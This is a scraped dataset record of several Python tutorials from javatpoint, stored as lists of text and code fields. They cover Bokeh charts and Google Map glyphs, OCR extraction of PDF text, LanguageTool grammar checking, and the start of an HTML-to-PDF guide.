discussed various types of data visualization, namely Bar chart, Box plot, Scatter Markers, Scatter Plots, and Single lines, which can be created using the bokeh library in Python.']",[],"['!pip3 install bokeh', '# First, we will import the required modules', 'from bokeh.plotting import figure as fig', 'from bokeh.plotting import output_notebook as ON', 'from bokeh.plotting import show', '# output to the notebook', '# creating figure', 'plot1 = fig(plot_width = 500, plot_height = 500, title = ""Scatter Markers"")', '# adding a circle renderer with size, color and alpha', 'plot1.circle([1, 2, 3, 4, 5, 6], [2, 1, 6, 8, 0],', 'size = 12, color = ""green"", alpha = 1)', '# show the results', 'show(plot1)', '# First, we will import the required modules', 'from bokeh.plotting import figure as fig', 'from bokeh.plotting import output_notebook as ON', 'from bokeh.plotting import show', '# output to the notebook', '# creating figure', 'plot1 = fig(plot_width = 500, plot_height = 500, title = ""Scatter Markers"")', '# adding a line renderer', 'plot1.line([1, 2, 3, 4, 5, 6], [2, 1, 6, 8, 0],', 'line_width = 4, color = ""red"")', '# show the results', 'show(plot1)', '# First, we will import the required modules', 'from bokeh.plotting import figure as fig', 'from bokeh.plotting import output_file as OF', 'from bokeh.plotting import show', '# file to save the model', 'output_file(""jtp.html"")', '', '# Now, instantiate the figure object', 'graph1 = fig(title = ""Bokeh Bar Graph"")', '# x-coordinates to be plotted', 'x = [1, 2, 3, 4, 5, 6, 7, 8]', '# y-coordinates of the top edges', 'top1 = [5, 1, 4, 3, 2, 7, 6, 8]', '# width / thickness of the bars', 'width1 = 0.7', '# plot the graph', 'graph1.vbar(x,', 'top = top1,', 'width = width1,', 'color = ""green"")', '# display the model', 'show(graph1)', '# First, we will import the required modules', 'from bokeh.plotting import figure as fig', 'from bokeh.plotting import output_file as OF', 'from bokeh.plotting import show', '# file to save the model', 'output_file(""jtp.html"")', '', '# Now, instantiate the figure object', 'graph1 = fig(title = ""Bokeh Bar Graph"")', '# x-coordinates to be plotted', 'x = [1, 2, 3, 4, 5, 6, 7, 8]', '# y-coordinates of the top edges', 'right1 = [5, 1, 4, 3, 2, 7, 6, 8]', '# width / thickness of the bars', 'height1 = 0.7', '# plot the graph', 'graph1.hbar(x,', 'right = right1,', 'height = height1,', 'color = ""green"")', '# display the model', 'show(graph1)', 'import numpy as nmp', 'import pandas as pnd', 'from bokeh.plotting import figure as fig', 'from bokeh.plotting import show', '# generate some time series for six different categories', 'cats_1 = list(""xyzprq"")', 'y_y = nmp.random.randn(2000)', 'g_1 = nmp.random.choice(cats_1, 2000)', 'for K, J in enumerate(cats_1):', 'y_y[g_1 == l] += K // 2', 'data_frame = pnd.DataFrame(dict(score = y_y, group = g_1))', '# now, we will find the quartiles and IQR for each category', ""groups1 = data_frame.groupby('group')"", 'q_1 = groups1.quantile(q = 0.25)', 'q_2 = groups1.quantile(q = 0.5)', 'q_3 = groups1.quantile(q = 0.75)', 'iqr = q3 - q1', 'upper = q3 + 1.5 * iqr', 'lower = q1 - 1.5 * iqr', '# now we will find the outliers for each category', 'def outliers(group2):', 'cat_2 = group2.name', ""return group2[(group2.score > upper.loc[cat_2]['score']) | (group2.score < lower.loc[cat_2]['score'])]['score']"", 'out = groups.apply(outliers).dropna()', '# here, we will prepare outlier data to plot, we would be needing coordinates for every outlier.', 'if not out.empty:', 'out_x = list(out.index.get_level_values(0))', 'out_y = list(out.values)', 'plot1 = fig(tools = """", background_fill_color = ""#efefef"", x_range = cats_1, toolbar_location = None)', '# if no outliers, we will shrink the lengths of stems to be no longer than the minimums or maximums', 'q_min = groups1.quantile(q = 0.00)', 'q_max = groups1.quantile(q = 1.00)', ""upper.score = [min([x,y]) for (x,y) in zip(list(q_max.loc[:, 'score']), upper.score)]"", ""lower.score = [max([x,y]) for (x,y) in zip(list(q_min.loc[:, 'score']), lower.score)]"", '# stems', 'plot1.segment(cats_1, upper.score, cats_1, q_3.score, line_color = ""black"")', 'plot1.segment(cats_1, lower.score, cats_1, q_1.score, line_color = ""black"")', '# boxes', 'plot1.vbar(cats_1, 0.7, q_2.score, q_3.score, fill_color = ""#E08E79"", line_color = ""black"")', 'plot1.vbar(cats_1, 0.7, q_1.score, q_2.score, fill_color = ""#3B8686"", line_color = ""black"")', '# whiskers (almost-0 height rects simpler than segments)', 'plot1.rect(cats_1, lower.score, 0.2, 0.01, line_color = ""black"")', 'plot1.rect(cats_1, upper.score, 0.2, 0.01, line_color = ""black"")', '# outliers', 'if not out.empty:', 'plot1.circle(outx, outy, size = 6, color = ""#F38630"", fill_alpha = 0.6)', 'plot1.xgrid.grid_line_color = None', 'plot1.ygrid.grid_line_color = ""white""', 'plot1.grid.grid_line_width = 2', 'plot1.xaxis.major_label_text_font_size = ""16px""', 'show(plot1)', '# First, we will import the required modules', 'from bokeh.plotting import figure as fig', 'from bokeh.plotting import output_file as OF', 'from bokeh.plotting import show', '# file for saving the model', 'OF(""jtp.html"")', '', '# instantiate the figure object', 'graph1 = fig(title = ""Bokeh Scatter Graph"")', '# the points to be plotted on Scatter Plot', 'x1 = [1.4, 5.1, 5.9, 2.3, 5.6, 8.6, 4.5, 2.1, 3.1, 4.3, 5.5, 4.4, 6.9, 2.1, 4, 5.2, 6.3, 7.2, 7.9, 2]', 'y1 = [3.4, 2.1, 5.7, 8.5, 4.3, 4.2, 5.7, 6.5, 8.9, 9.1, 1.5, 2.1, 6.8, 1, 6, 5.2, 4.5, 7.4, 7.5, 6.3]', '# plott the graph', 'graph1.scatter(x1, y1)', '# display the model', 'show(graph1)']",[],[],['|||models: it is a low-level interface which provides high flexibility to the application developers.|||plotting: it is a high-level interface which is used for creating visual glyphs.|||']
394,['How to Plot glyphs over a Google Map by using Bokeh Library in Python'],"['Bokeh is an Interactive Data visualization library of Python. It creates its plots by using HTML and JavaScript languages. Its basic targets are modern website browsers for presenting provided elegance, concise construction of novel graphics with high-performance interactivity.']","['https://www.javatpoint.com/how-to-plot-a-pie-chart-using-bokeh-library-in-python', 'https://www.javatpoint.com/data-visualization-in-python-using-bokeh-library', 'https://www.javatpoint.com/how-to-plot-a-pie-chart-using-bokeh-library-in-python', 'https://www.javatpoint.com/data-visualization-in-python-using-bokeh-library', 'https://www.javatpoint.com/how-to-plot-a-pie-chart-using-bokeh-library-in-python']",['https://static.javatpoint.com/python/images/how-to-plot-glyphs-over-a-google-map-by-using-bokeh-library-in-python.png'],[],['Conclusion'],"['gmap()', 'GMapOptions()']",[],"['Parameters:', 'It will return an object of the class GMap', 'Parameters:', 'It returns an object of the class GMapOptions', 'Steps for plotting glyphs over a Google map:', 'Step 1: Import the following modules and libraries:', 'Step 2: Create a file for storing the model by using the output_file()', 'Step 3: Configure Google map by using GMapOptions()', 'Step 4: Generate a Google map object by using the gmap()', 'Step 5: Define the coordinates of the glyphs y using the ColumnDataSource()', 'Step 6: Generate the glyphs on the above created object of Google Maps.', 'Step 7: Display the output of Google Maps by using the show()', 'In this tutorial, we have discussed how we can plot glyphs over a Google Map by using the Bokeh library in Python.']","['The bokeh library is used for plotting glyphs over a Google map. A glyph is a hieroglyphic symbol or a character. For using Google Maps in Bokeh, we can use the gmap() function of the bokeh.plotting class.']",[],"['gmap(parameter)', 'GMapOptions(parameters)', '# First, import the required modules', 'from bokeh.plotting import gmap as GM', 'from bokeh.models import ColumnDataSource as CDS', 'from bokeh.models import GMapOptions as GMO', 'from bokeh.io import output_file as OF', 'from bokeh.io import show', '# first, we will create a file for saving the model', 'OF(""glyphs.html"")', '# here, we will configure the Google map', 'latitude = 27.2046', 'longitude = 77.4977', 'map_type1 = ""satellite""', 'zoom1 = 15', 'google_map_options1 = GMO(lat = latitude,', 'lng = longitude,', 'map_type = map_type1,', 'zoom = zoom1)', '# Here, we will generate the Google map', 'google_api_key = """"', 'title1 = ""BIJNOR""', 'google_map1 = GM(google_api_key,', 'google_map_options1,', 'title = title1)', '# Here, we will define the coordinates of the glyphs', 'source1 = CDS(', 'data = dict(latitude = [27.00, 27.10, 27.15, 27.20, 27.25, 27.30, 27.35],', 'longitude = [77.30, 77.35, 77.40, 77.45, 77.50, 77.55, 77.60]))', '# here, we will generate the glyphs over the Google map', 'x1 = ""longitude""', 'y1 = ""latitude""', 'size1 = 30', 'fill_color1 = ""red""', 'fill_alpha1 = 1', 'google_map1.square(x = x1,', 'y = y1,', 'size = size1,', 'fill_color = fill_color1,', 'fill_alpha = fill_alpha1,', 'source = source1)', '# At last, we will display the model', 'show(google_map1)']",[],[],"['|||google_api_key: It is a key of the Google API|||map_options: GmapOptions, that is, the configuration which is specific to the Google map|||active_drag: It is a dragging tool that has to be initially active.|||active_inspect: It is an inspecting tool that has to be initially active.|||active_scroll: It is a scrolling tool that has to be initially active.|||active_tap: It is a tapping tool that has to be initially active.|||title: It is the title of the Google map.|||tools: These are tools with which the plot should start.|||x_axis_label: It is used for labelling the x-axis|||x_axis_location: It is a location of the x-axis|||x_minor_ticks: These are the number of minor ticks between adjacent x-axis major ticks|||y_axis_label: It is used for labelling the y-axis|||y_axis_location: It is a location of the y-axis|||y_minor_ticks: These are the number of minor ticks between adjacent y-axis major ticks||||||lat: It is used for the latitude where the Google map is to be centred.|||lng: It is used for longitude where the Google map is to be centred.|||map_type: It defines the type of Google maps to use for the plot. Here are the four types of maps available:||||||-Hybrid|||-Roadmap|||-Satellite|||-Terrain|||||||||name: It is the name for the Google map.|||scale_control: It defines whether the Google map should display its distance scale control.|||styles: It is used for defining the style of map to be used for the plot.|||subscribed_events: The is used for defining the list of events that are subscribed to by Python callbacks.|||tags: These are the tags linked with the Google map model.|||tilt: It is used for tilting the angle of the map.|||zoom: It is an initial zoom level of the Google map.|||apply_theme: It is a theme of the model.||||||-Hybrid|||-Roadmap|||-Satellite|||-Terrain||||||gmap from bokeh.plotting|||ColumnDataSource from bokeh.models|||GmapOptions from bokeh.models|||output_file from bokeh.io|||show from bokeh.io|||']"
395,['How to Plot a Pie Chart using Bokeh Library in Python'],"['Bokeh is a Python library which is used for data visualization. It creates its plots using HTML and JavaScript languages, and it also targets modern website browsers to provide presentation elegant, concise construction of novel graphics good high-performance interactivity.']","['https://www.javatpoint.com/how-to-read-contents-of-pdf-using-ocr-in-python', 'https://www.javatpoint.com/how-to-plot-glyphs-over-a-google-map-by-using-bokeh-library-in-python', 'https://www.javatpoint.com/how-to-read-contents-of-pdf-using-ocr-in-python', 'https://www.javatpoint.com/how-to-plot-glyphs-over-a-google-map-by-using-bokeh-library-in-python', 'https://www.javatpoint.com/how-to-read-contents-of-pdf-using-ocr-in-python']","['https://static.javatpoint.com/python/images/how-to-plot-a-pie-chart-using-bokeh-library-in-python.png', 'https://static.javatpoint.com/python/images/how-to-plot-a-pie-chart-using-bokeh-library-in-python2.png']",[],['Conclusion'],"['Example 1:', 'Example 2:']",[],"['The wedge () function has the following primary parameters:', 'The user can convert the percentage into radian for finding the value of start_angle and end_angle by using the following formula:', 'In this tutorial, we have discussed how we can plot a pie chart for the visualization of data by using the bokeh library in Python.']","['In this tutorial, we will learn how to plot a pie chart by using the Bokeh library in Python. Although the bokeh library does not provide any module for directly plotting a pie chart, users can use wedge glyphs to create the pie chart.', 'To plot wedges in such a way that the output looks like a pie chart. However, the x and y coordinates of the wedge and the radius parameters, the user has to adjust the start_angle and end_angle parameters.', 'In this example, the user will visualize some data. The data contains the detail of the field in which a company invested in 2014 - 15. The fields are:']",[],"['# First, we will import the required modules', 'from bokeh.plotting import figure as fig', 'from bokeh.plotting import output_file as OF', 'from bokeh.plotting import show', '# Create a file for saving the model', 'OF(""JTP.html"")', '', '# then, we will instantiate the figure object', 'graph1 = fig(title = ""Pie Chart using Bokeh"")', '# initiate the center of the pie chart', '# then, we will initiate the radius of the glyphs', 'radius = 1', '# start angle values', 'start_angle = [0, 1.2, 2.1,', '3.3, 5.1]', '# end angle values', 'end_angle = [1.2, 2.1, 3.3,', '5.1, 0]', '# now, generate the color of the wedges', 'color1 = [""brown"", ""grey"", ""green"",', '""orange"", ""red""]', '# now, we will plot the graph', 'graph1.wedge(x, y, radius,', 'start_angle,', 'end_angle,', 'color = color1)', '# At last, we will display the graph', 'show(graph1)', 'math.radians((percent / 100) * 360)', '# First, we will import the required modules', 'from bokeh.plotting import figure as fig', 'from bokeh.plotting import output_file as OF', 'from bokeh.plotting import show', 'import math', '# Create a file for saving the model', 'OF(""JTP.html"")', '', '# then, we will instantiate the figure object', 'graph1 = fig(title = ""Pie Chart using Bokeh"")', '# name of the fields for investment', 'fields = [""Customers"", ""Innovation"", ""Shares"", ""Marketing"", ""Technology""]', '# % tage weightage of the sectors', 'percentages = [12.5, 32.1, 21.2, 15.1, 19.1]', '# formula for converting percentage into radians', 'radians1 = [math.radians((percent / 100) * 360) for percent in percentages]', '# Generating the start angle values', 'start_angle = [math.radians(0)]', 'prev = start_angle[0]', 'for k in radians1[:-1]:', 'start_angle.append(k + prev)', 'prev = k + prev', '# generating the end angle values', 'end_angle = start_angle[1:] + [math.radians(0)]', '# initiate the center of the pie chart', '# then, we will initiate the radius of the glyphs', 'radius = 1', '# now, generate the color of the wedges', 'color1 = [""pink"", ""yellow"", ""lightgreen"",', '""orange"", ""red""]', '# now, we will plot the graph', 'for k in range(len(fields)):', 'graph1.wedge(x, y, radius,', 'start_angle = start_angle[k],', 'end_angle = end_angle[k],', 'color = color1[k],', 'legend_label = fields[k])', '# At last, we will display the graph', 'show(graph1)']",[],[],['|||The x and y coordinates of wedge|||The radius|||The start_angle of wedge|||The end_angle of wedge||||||Customers: 5%|||Innovation: 1%|||Shares: 2%|||Marketing: 1%|||Technology: 1%|||']
396,['How to Read Contents of PDF using OCR (Optical Character Recognition) in Python'],"[""Python is one of the most preferred programming languages in today's world. We can use it for analyzing the data, but data is not always available in the required format. In such cases, we can convert the format of the file from pdf, jpg to the text (.txt) format for analyzing the data in a better way. There are many libraries available to perform such tasks.""]","['https://www.javatpoint.com/grammar-and-spell-checker-in-python', 'https://www.javatpoint.com/how-to-plot-a-pie-chart-using-bokeh-library-in-python', 'https://www.javatpoint.com/https://visualstudio.microsoft.com/downloads/', 'https://www.javatpoint.com/grammar-and-spell-checker-in-python', 'https://www.javatpoint.com/how-to-plot-a-pie-chart-using-bokeh-library-in-python', 'https://www.javatpoint.com/grammar-and-spell-checker-in-python']","['https://static.javatpoint.com/python/images/how-to-read-contents-of-pdf-using-ocr-in-python.png', 'https://static.javatpoint.com/python/images/how-to-read-contents-of-pdf-using-ocr-in-python2.png']",[],"['Advantages of using OCR method:', 'Disadvantages of using OCR method:', 'Conclusion']","['Required Modules:', 'Part 1:', 'Part 2:', 'Code:']",[],"['We have to install the following modules using the given command for this tutorial:', '(for this the user should have Microsoft Visual C++ 14.0, Get it with ""Build Tools for Visual Studio"": https://visualstudio.microsoft.com/downloads/)', 'Input PDF file:', 'Output Text file:', 'As we can see, the pages of the PDF file how converted into images. Then those images were read, and their content was written into a text file.', ""In this tutorial, we have discussed how to read the PDF files' content by using OCR in Python.""]","['In this tutorial, we will learn how to read the content of a PDF file and store it in a text (.txt) format by using ""Optical Character Recognition"" method.', 'At first, we have to convert the pages of the PDF document file into images, and then, we will use OCR for reading the content from the image and storing it in the text (.txt) format file.', 'The first part will deal with converting my PDF pages into image files. Each page of the PDF file will be stored as an image file, and the names of the images will be stored as:', 'For such words, we will do a fundamental pre-processing for converting the hyphen and the following line into a full word. When we complete the pre-processing, this text will be sorted in a separate text file.']","['We can use the PyPDF2 module of Python for performing the task of converting the .pdf file into text format. The major disadvantage we can face while using this module is the encoding scheme. The PDF document files can contain a variety of encodings such as Unicode, ASCII, UTF-8, and many more. Therefore, converting PDF files into text may result in loss of data because of encoding schema.', 'The second part would deal with recognizing the text from the image files in sorting it into the text file in "".txt"" format. Here, we will process the image files for converting them into text content. Once we have the text as a string variable, we can start processing the text (.txt) file. Such as, in many PFD files, we can see that when a line is complete, but the last word cannot be written entirely in the same line, then, a hyphen is added in the end, and the word is continued in the following line. For example:']","['!pip3 install PIL', '!pip3 install pytesseract', '!pip3 install pdf2image', '!pip3 install tesseract-ocr', 'PDF page no. 1: page_no_1.jpg', 'PDF page no. 2: page_no_2.jpg', 'PDF page no. 3: page_no_3.jpg', 'PDF page no. 4: page_no_4.jpg', 'PDF page no. n: page_no_n.jpg', 'This is an example to show the above explanation of the wo-', 'rd which cannot be written entirely in the same line and is conti-', 'nued in the next line.', 'from PIL import Image as img', 'import pytesseract as PT', 'import sys', 'from pdf2image import convert_from_path as CFP', 'import os', '# Importing the pdf file', 'PDF_file_1 = ""exp.pdf""', 'pages_1 = CFP(PDF_file1, 9)', '# Now, we will create a counter for storing images of each page of PDF to image', 'image_counter1 = 1', '# Iterating through all the pages of the pdf file stored above', 'for page in pages_1:', '# We will Declare the  filename for each page of PDF file as JPG file', '# For each page, the filename will be:', '# PDF page no. 1: Page_no_1.jpg', '# PDF page no.2: Page_no_2.jpg', '# PDF page no. 3: Page_no_3.jpg', '# PDF page no. 4: Page_no_4.jpg', '# .... and so on..', '# PDF page n: page_n.jpg', 'filename1 = ""Page_no_"" + str(image_counter) + "" .jpg""', '# Now, we will save the image of the page in system', ""page.save(filename1, 'JPEG')"", '# Then, we will increase the counter for updating filenames', 'image_counter1 = image_counter1 + 1', 'Part #2 - Recognize the text content from the image files by using OCR', '# Variable for getting the count of the total number of pages', 'filelimit1 = image_counter1 - 1', '# then, we will create a text file for writing the output', 'out_file1 = ""output_text.txt""', '# Now, we will open the output file in append mode so that all contents of the # images will be added in the same output file.', 'f_1 = open(out_file1, ""a"")', '# Iterating from 1 to total number of pages', 'for K in range(1, filelimit1 + 1):', '# Now, we will set filename for recognizing text from images', '# Again, these files will be:', '# Page_no_1.jpg', '# Page_no_2.jpg', '# Page_no_3.jpg', '# ....', '# page_no_n.jpg', 'filename1 = ""Page_no_"" + str(K) + "" .jpg""', '', '# Here, we will write a code for recognizing the text as a string variable in an image file by using the pytesserct module', 'text1 = str(((PT.image_to_string (Image.open (filename1)))))', '# : The recognized text will be stored in variable text', '# : Any string variable processing may be applied to text content', '# : Here, basic formatting will be done:-', ""text1 = text1.replace('-\\n', '')"", '# At last, we will write the processed text into the file.', 'f_1.write(text1)', '# Closing the file after writing all the text content.', 'f_1.close()']",[],[],"['|||PIL: -||||||pytesseract: -||||||pdf2image: -||||||tesseract-ocr: -||||||The user can avoid text-based conversions, which can cause loss of data due to the encoding scheme.|||The OCR module can also recognize the handwritten content in a PDF file.|||The user can also modify recognizing only particular pages of the PDF by using the OCR module.|||The pre-processing can be done in a large amount as it gets the text in a variable form.||||||The disk storage is used for storing the image files in the local system. However, these files take very little space.|||The use of OCR does not guarantee 100% of accuracy. Whereas the PDF file documents created on computer result in very high accuracy.|||The OCR module can recognize handwritten content, but the accuracy depends on numerous factors such as the color of the page, how clear the handwriting is, and many more.|||']"
397,['Grammar and Spell Checker in Python'],"['In the following tutorial, we will discuss a Python package called LanguageTool and understand how to create a simple grammar and spell checker using the Python programming language.']","['https://www.javatpoint.com/converting-html-to-pdf-files-using-python', 'https://www.javatpoint.com/how-to-read-contents-of-pdf-using-ocr-in-python', 'https://www.javatpoint.com/converting-html-to-pdf-files-using-python', 'https://www.javatpoint.com/how-to-read-contents-of-pdf-using-ocr-in-python', 'https://www.javatpoint.com/converting-html-to-pdf-files-using-python']",[],[],"['Understanding the LanguageTool library in Python', 'Working with the Python LanguageTool library', 'Applying Suggestions to the Text automatically']","['How to Install the LanguageTool library?', 'Verifying the Installation']",[],"[""So, let's get begun."", 'Once the library is installed, we can verify it by creating an empty Python program file and writing an import statement as follows:', 'File: verify.py', 'Now, save the above file and execute it using the following command in a terminal:', 'Explanation:', 'Since we have detected the mistakes, it is time for us to correct them. Let us consider the following Python script demonstrating the same:', 'Explanation:', 'Hence, we have successfully corrected the mistakes that we find out in the previous snippet of code.', 'Now, let us observe the mistakes that we captured earlier along with their respective corrections using the following Python script:', 'Explanation:', 'In the above snippet of code, we have printed the list of the mistakes in the Text with their respective corrections.', 'Let us consider a simple example demonstrating how we can apply suggestions automatically to the Text using the LanguageTool library in Python.', 'Explanation:']","['The above text contains some grammatical and spelling errors highlighted in bold. Let us consider the following Python script to understand the working of the LanguageTool utility:', 'As a result, we can observe that we have a detailed dictionary that displays the ruleId, message, replacements, offsetInContext, context, offset, and a lot more. We can find a detailed explanation of every rule ID in the LanguageTool Community.']","['LanguageTool is an open-source tool used for grammar and spell-checking purposes, and it is also known as the spellchecker for OpenOffice. This package allows programmers to detect grammatical and spelling mistakes through a Python code snippet or a Command-line Interface (CLI).', ""To install the Python library, we need 'pip', a framework to manage packages required to install the modules from the trusted public repositories. Once we have 'pip', we can install the LanguageTool library using the command from a Windows command prompt (CMD) or terminal as shown below:"", 'The language_tool_python library will download a LanguageTool server as a JAR file by default and execute that in the background to detect grammatical errors locally. But LanguageTool also provides a Public HTTP Proofreading API that is supported; however, there is a limitation in the number of calls.', 'If the above Python program file does not return any error, the library is installed properly. However, in the case where an exception is raised, try reinstalling the library, and it is also recommended to refer to the official documentation of the module.', 'In the following section, we will understand the working of the LanguageTool library in Python using a practical example. The following Python script demonstrates the detection of grammatical mistakes and correcting them as well. We will work with the following text:', 'In the above snippet of code, we have imported the required library and defined a tool that uses the LanguageTool utility to check the grammar and spelling errors in the text. We have then defined another string variable that stores the text passage we wanted to check. We have then retrieved the match using the check() function and printed them for the users.', 'We have included some new variables to address mistakes, corrections, starting positions, and ending positions in the above snippet of code. We have then used the for-loop to iterate through the rules in my_matches and replace the mistakes with their corrections. We have then stored these corrected texts in a list. At last, we have again used the for-loop to iterate through the string elements in the list, join them together, and print the resulting text for the users.', 'In the above snippet of code, we have imported the required library and defined the tool for LanguageTool specifying the language as US English. We have then defined a string variable and stored some text to it. We have then used the correct() function of the tool to automatically correct the mistake in the text and print the resultant text for the users.']","['$ pip install language-tool-python', 'import language_tool_python', '$ python verify.py', '# importing the package', 'import language_tool_python', '# using the tool', ""my_tool = language_tool_python.LanguageTool('en-US')"", '# given text', 'my_text = """"""LanguageTool provides utility to check grammar and spelling errors. We just have to paste the text here and click the \'Check Text\' button. Click the colored phrases for for information on potential errors. or we can use this text too see an some of the issues that LanguageTool can dedect. Whot do someone thinks of grammar checkers? Please not that they are not perfect. Style problems get a blue marker: It is 7 P.M. in the evening. The weather was nice on Monday, 22 November 2021""""""', '# getting the matches', 'my_matches = my_tool.check(my_text)', '# printing matches', 'print(my_matches)', '# importing the package', 'import language_tool_python', '# using the tool', ""my_tool = language_tool_python.LanguageTool('en-US')"", '# given text', 'my_text = """"""LanguageTool provides utility to check grammar and spelling errors. We just have to paste the text here and click the \'Check Text\' button. Click the colored phrases for for information on potential errors. or we can use this text too see an some of the issues that LanguageTool can dedect. Whot do someone thinks of grammar checkers? Please not that they are not perfect. Style problems get a blue marker: It is 7 P.M. in the evening. The weather was nice on Monday, 22 November 2021""""""', '# getting the matches', 'my_matches = my_tool.check(my_text)', '# defining some variables', 'myMistakes = []', 'myCorrections = []', 'startPositions = []', 'endPositions = []', '# using the for-loop', 'for rules in my_matches:', 'if len(rules.replacements) > 0:', 'startPositions.append(rules.offset)', 'endPositions.append(rules.errorLength + rules.offset)', 'myMistakes.append(my_text[rules.offset : rules.errorLength + rules.offset])', 'myCorrections.append(rules.replacements[0])', '# creating new object', 'my_NewText = list(my_text)', '# rewriting the correct passage', 'for n in range(len(startPositions)):', 'for i in range(len(my_text)):', 'my_NewText[startPositions[n]] = myCorrections[n]', 'if (i > startPositions[n] and i < endPositions[n]):', 'my_NewText[i] = """"', 'my_NewText = """".join(my_NewText)', '# printing the text', 'print(my_NewText)', 'print(list(zip(myMistakes, myCorrections)))', '# importing the library', 'import language_tool_python', '# creating the tool', ""my_tool = language_tool_python.LanguageTool('en-US')"", '# given text', ""my_text = 'A quick broun fox jumpps over a a little lazy dog.'"", '# correction', 'correct_text = my_tool.correct(my_text)', '# printing some texts', 'print(""Original Text:"", my_text)', 'print(""Text after correction:"", correct_text)']","['[Match({\'ruleId\': \'ENGLISH_WORD_REPEAT_RULE\', \'message\': \'Possible typo: you repeated a word\', \'replacements\': [\'for\'], \'offsetInContext\': 43, \'context\': ""...Text\' button. Click the colored phrases for for information on potential errors. or we ..."", \'offset\': 165, \'errorLength\': 7, \'category\': \'MISC\', \'ruleIssueType\': \'duplication\', \'sentence\': \'Click the colored phrases for for information on potential errors.\'}), Match({\'ruleId\': \'UPPERCASE_SENTENCE_START\', \'message\': \'This sentence does not start with an uppercase letter.\', \'replacements\': [\'Or\'], \'offsetInContext\': 43, \'context\': \'...or for information on potential errors. or we can use this text too see an some of...\', \'offset\': 206, \'errorLength\': 2, \'category\': \'CASING\', \'ruleIssueType\': \'typographical\', \'sentence\': \'or we can use this text too see an some of the issues that LanguageTool can dedect.\'}), Match({\'ruleId\': \'TOO_TO\', \'message\': \'Did you mean ""to see""?\', \'replacements\': [\'to see\'], \'offsetInContext\': 43, \'context\': \'...tential errors. or we can use this text too see an some of the issues that LanguageTool...\', \'offset\': 230, \'errorLength\': 7, \'category\': \'CONFUSED_WORDS\', \'ruleIssueType\': \'misspelling\', \'sentence\': \'or we can use this text too see an some of the issues that LanguageTool can dedect.\'}), Match({\'ruleId\': \'EN_A_VS_AN\', \'message\': \'Use ""a"" instead of \'an\' if the following word doesn\'t start with a vowel sound, e.g. \'a sentence\', \'a university\'.\', \'replacements\': [\'a\'], \'offsetInContext\': 43, \'context\': \'...errors. or we can use this text too see an some of the issues that LanguageTool ca...\', \'offset\': 238, \'errorLength\': 2, \'category\': \'MISC\', \'ruleIssueType\': \'misspelling\', \'sentence\': \'or we can use this text too see an some of the issues that LanguageTool can dedect.\'}), Match({\'ruleId\': \'MORFOLOGIK_RULE_EN_US\', \'message\': \'Possible spelling mistake found.\', \'replacements\': [\'detect\', \'defect\', \'deduct\', \'deject\'], \'offsetInContext\': 43, \'context\': \'...ome of the issues that LanguageTool can dedect. Whot do someone thinks of grammar chec...\', \'offset\': 282, \'errorLength\': 6, \'category\': \'TYPOS\', \'ruleIssueType\': \'misspelling\', \'sentence\': \'or we can use this text too see an some of the issues that LanguageTool can dedect.\'}), Match({\'ruleId\': \'MORFOLOGIK_RULE_EN_US\', \'message\': \'Possible spelling mistake found.\', \'replacements\': [\'Who\', \'What\', \'Shot\', \'Whom\', \'Hot\', \'WHO\', \'Whet\', \'Whit\', \'Whoa\', \'Whop\', \'WHT\', \'Wot\', \'W hot\'], \'offsetInContext\': 43, \'context\': \'...he issues that LanguageTool can dedect. Whot do someone thinks of grammar checkers? ...\', \'offset\': 290, \'errorLength\': 4, \'category\': \'TYPOS\', \'ruleIssueType\': \'misspelling\', \'sentence\': \'Whot do someone thinks of grammar checkers?\'}), Match({\'ruleId\': \'PLEASE_NOT_THAT\', \'message\': \'Did you mean ""note""?\', \'replacements\': [\'note\'], \'offsetInContext\': 43, \'context\': \'...eone thinks of grammar checkers? Please not that they are not perfect. Style proble...\', \'offset\': 341, \'errorLength\': 3, \'category\': \'TYPOS\', \'ruleIssueType\': \'misspelling\', \'sentence\': \'Please not that they are not perfect.\'}), Match({\'ruleId\': \'PM_IN_THE_EVENING\', \'message\': \'This is redundant. Consider using ""P.M.""\', \'replacements\': [\'P.M.\'], \'offsetInContext\': 43, \'context\': \'...yle problems get a blue marker: It is 7 P.M. in the evening. The weather was nice on Monday, 22 Nov...\', \'offset\': 414, \'errorLength\': 19, \'category\': \'REDUNDANCY\', \'ruleIssueType\': \'style\', \'sentence\': \'Style problems get a blue marker: It is 7 P.M. in the evening.\'})]', ""LanguageTool provides utility to check grammar and spelling errors. We just have to paste the text here and click the 'Check Text' button. Click the colored phrases for information on potential errors. Or we can use this text to see a some of the issues that LanguageTool can detect. Who do someone thinks of grammar checkers? Please note that they are not perfect. Style problems get a blue marker: It is 7 P.M.. The weather was nice on Monday, 22 November 2021"", ""[('for for', 'for'), ('or', 'Or'), ('too see', 'to see'), ('an', 'a'), ('dedect', 'detect'), ('Whot', 'Who'), ('not', 'note'), ('P.M. in the evening', 'P.M.')]"", 'Original Text: A quick broun fox jumpps over a a little lazy dog.', 'Text after correction: A quick brown fox jumps over a little lazy dog.']",[],[]
398,['Converting HTML to PDF files using Python'],"[""Most of us might know that there are many websites that do not provide permission to their users to download the website's content in a PDF format file. Instead, they either ask them to buy the premium version of their service or do not offer such a download service in the form of a PDF file.""]","['https://www.javatpoint.com/readlines-in-python', 'https://www.javatpoint.com/grammar-and-spell-checker-in-python', 'https://www.javatpoint.com/https://wkhtmltopdf.org/downloads.html', 'https://www.javatpoint.com/readlines-in-python', 'https://www.javatpoint.com/grammar-and-spell-checker-in-python', 'https://www.javatpoint.com/readlines-in-python']","['https://static.javatpoint.com/python/images/converting-html-to-pdf-files-using-python.png', 'https://static.javatpoint.com/python/images/converting-html-to-pdf-files-using-python2.png', 'https://static.javatpoint.com/python/images/converting-html-to-pdf-files-using-python3.png']",[],"['Understanding the Python PDFKit module', 'Working with PDFKit in Python']","['How to Install the Python PDFKit Module?', 'Verifying the Installation']",[],"['Now, we have to install the dependencies of the PDFKit module, i.e., wkhtmltopdf tool.', 'For Ubuntu/Debian:', 'Type the following command:', 'For Windows:', 'Step 1: We can download the wkhtmltopdf tool from the following link:', 'https://wkhtmltopdf.org/downloads.html', 'Step 2: Set the PATH variable to the binary folder in Environment Variables.', 'Once the module is installed, we can verify it by creating an empty Python program file and writing an import statement as follows:', 'File: verify.py', 'Now, save the above file and execute it using the following command in a terminal:', 'Now, let us start working with PDFKit in Python.', 'Explanation:', 'As a result, we have successfully converted the local HTML file to a PDF file.', 'Explanation:', 'As a result, we have successfully converted the URL to a PDF file.', 'Explanation:', 'As a result, we have successfully stored the string into a PDF file.']","['However, a programming language like Python provides the PDFKit module to generate PDF files. In the following tutorial, we will understand how we can convert HTML to PDF files with the help of the PDFKit module in the Python programming language.', 'This section will demonstrate how to convert HTML to 